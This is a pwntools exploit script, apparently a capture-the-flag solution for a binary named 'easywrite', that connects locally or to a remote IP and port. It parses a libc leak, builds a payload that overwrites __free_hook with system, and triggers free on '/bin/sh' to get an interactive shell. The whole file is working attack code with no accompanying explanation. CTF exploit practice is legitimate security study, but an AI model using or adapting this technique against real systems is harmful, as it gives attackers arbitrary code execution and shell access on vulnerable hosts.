from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

TARGET = './easywrite'
HOST = '124.156.183.246'
PORT = 20000

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)
    # return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
    debug(r, [])

r.recvuntil('gift:') 
leak = int(r.recvuntil('\n', True), 16)
dbg('leak')
base = leak - 0x8ec50

fh = base + 0x1eeb28
system = base + 0x55410
point_tps = base + 0x1f34f0

payload = ''
payload += flat(0x0000000100000000, 0)
payload += flat(0, 0) * 8
payload += p64(fh-8)

r.sendafter(':', payload) #what
r.sendafter(':', p64(point_tps)) #where
r.sendafter(':', "/bin/sh\x00"+p64(system)) #trigger free

r.interactive()
r.close()
